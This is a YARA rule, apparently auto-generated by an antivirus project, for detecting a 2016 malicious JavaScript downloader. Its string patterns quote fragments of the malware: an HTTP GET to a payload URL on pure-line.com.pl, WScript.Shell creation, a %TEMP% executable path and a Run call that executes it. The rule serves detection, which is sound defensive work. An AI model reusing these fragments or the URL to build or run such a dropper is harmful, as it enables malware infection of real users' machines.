rule sig_20160330_fba6cccb626a7037b7f068d4e32e82e4 {
  meta:
    description = "datamaliciousorder - file 20160330_fba6cccb626a7037b7f068d4e32e82e4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7055d9daaa953bed3b7a3a89157cfffa67b264b310d6b309f3d0078343893887"

  strings:
    $s1  = "FB[C](\"GET\", \"http://pure-line.com.pl/f6splw\", false);" fullword ascii
    $s2  = "var DY = function FY() {return WScript[RQ](\"WScript\"+\".Shell\");}(), K0 = 11;" fullword ascii
    $s3  = "function UO(P, SF){H0 = H0 * 1; return P - SF;};" fullword ascii
    $s4  = "if (FB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OH(){return OE + \"\";};" fullword ascii
    $s6  = "function H() {return DY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KAT1iJDcU.ex\" + \"e\";};" fullword ascii
    $s7  = "function AU(PB){DY[\"Run\"](PB, H0, H0);};" fullword ascii
    $s8  = "function GJ() {return ((MY == true) && (MY == T)) ? 1 : H0;};" fullword ascii
    $s9  = "function Z(){return 22;};" fullword ascii
    $s10 = "function W()" fullword ascii
    $s11 = "function ZT(K) {var NW = (1, 2, 3, 4, 5, K); return NW;};" fullword ascii
    $s12 = "var ZE = new this[\"Date\"]();" fullword ascii
    $s13 = "}while (DF);" fullword ascii
    $s14 = "return UO(OP, R);" fullword ascii
    $s15 = "function QM(){return RQ;};" fullword ascii
    $s16 = "T = true; " fullword ascii
    $s17 = "var T = false;" fullword ascii
    $s18 = "MY = true; " fullword ascii
    $s19 = "var MY = false;" fullword ascii
    $s20 = "} catch(NS){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}